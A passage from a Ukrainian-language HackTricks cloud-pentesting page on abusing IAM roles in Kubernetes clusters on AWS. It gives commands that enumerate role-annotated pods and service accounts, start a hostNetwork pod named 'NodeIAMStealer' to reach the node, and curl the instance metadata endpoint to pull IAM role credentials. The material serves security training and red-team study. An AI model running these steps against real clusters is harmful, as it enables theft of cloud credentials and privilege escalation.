–Ü–Ω–æ–¥—ñ **–ü–æ–ª—ñ—Ç–∏–∫–∞ –¥–æ–≤—ñ—Ä–∏ —Ä–æ–ª—ñ** –º–æ–∂–µ –±—É—Ç–∏ **–ø–æ–≥–∞–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞**, —ñ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ AssumeRole –æ—á—ñ–∫—É–≤–∞–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏, –≤–æ–Ω–∞ –Ω–∞–¥–∞—î –π–æ–≥–æ **–≤—Å—ñ–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–∞–º —Å–ª—É–∂–±–∏**. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –∑–¥–∞—Ç–Ω—ñ –∑–∞–ø–∏—Å–∞—Ç–∏ –∞–Ω–æ—Ç–∞—Ü—ñ—é –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ —Å–ª—É–∂–±–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–æ–ª—ñ.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### –ó–Ω–∞–π—Ç–∏ Pods a SAs –∑ IAM —Ä–æ–ª—è–º–∏ –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ

–¶–µ —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ª–µ–≥–∫–æ–≥–æ **—ñ—Ç–µ—Ä–∞—Ü—ñ—ó –ø–æ –≤—Å—ñ—Ö pod —Ç–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è–º sas**, **—à—É–∫–∞—é—á–∏** —Ü—é **–∞–Ω–æ—Ç–∞—Ü—ñ—é**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ä–æ–∑–¥—ñ–ª —Å—Ç–æ—Å—É–≤–∞–≤—Å—è —Ç–æ–≥–æ, —è–∫ –≤–∫—Ä–∞—Å—Ç–∏ IAM —Ä–æ–ª—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–æ–¥—ñ–≤, –∞–ª–µ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–≤—É–∑–æ–ª** K8s –∫–ª–∞—Å—Ç–µ—Ä–∞ –±—É–¥–µ **–µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ö–º–∞—Ä–∏**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—É–∑–æ–ª, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ **–º–∞—Ç–∏ –Ω–æ–≤—É IAM —Ä–æ–ª—å, —è–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫—Ä–∞—Å—Ç–∏** (_–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–∑–≤–∏—á–∞–π –≤—Å—ñ –≤—É–∑–ª–∏ K8s –∫–ª–∞—Å—Ç–µ—Ä–∞ –º–∞—é—Ç—å –æ–¥–Ω–∞–∫–æ–≤—É IAM —Ä–æ–ª—å, —Ç–æ–º—É –º–æ–∂–µ –Ω–µ –º–∞—Ç–∏ —Å–µ–Ω—Å—É –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –∫–æ–∂–µ–Ω –≤—É–∑–æ–ª_).

–û–¥–Ω–∞–∫ —î –≤–∞–∂–ª–∏–≤–∞ –≤–∏–º–æ–≥–∞ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –∑ –≤—É–∑–ª–∞, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ –Ω–∞ –≤—É–∑–ª—ñ (—Å–µ–∞–Ω—Å ssh?) –∞–±–æ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –º–∞—Ç–∏ —Ç—É –∂ –º–µ—Ä–µ–∂—É:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### –í–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω IAM —Ä–æ–ª—ñ

–†–∞–Ω—ñ—à–µ –º–∏ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–∏, —è–∫ **–ø—Ä–∏–∫—Ä—ñ–ø–∏—Ç–∏ IAM —Ä–æ–ª—ñ –¥–æ Pods** –∞–±–æ –Ω–∞–≤—ñ—Ç—å —è–∫ **–≤—Ç–µ–∫—Ç–∏ –¥–æ –≤—É–∑–ª–∞, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ IAM —Ä–æ–ª—å**, —è–∫—É –µ–∫–∑–µ–º–ø–ª—è—Ä –º–∞—î –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—é –¥–æ –Ω—å–æ–≥–æ.

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, —â–æ–± **–≤–∫—Ä–∞—Å—Ç–∏** –≤–∞—à—ñ –Ω–æ–≤—ñ –≤–∞–∂–∫–æ –∑–∞—Ä–æ–±–ª–µ–Ω—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ IAM —Ä–æ–ª—ñ**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
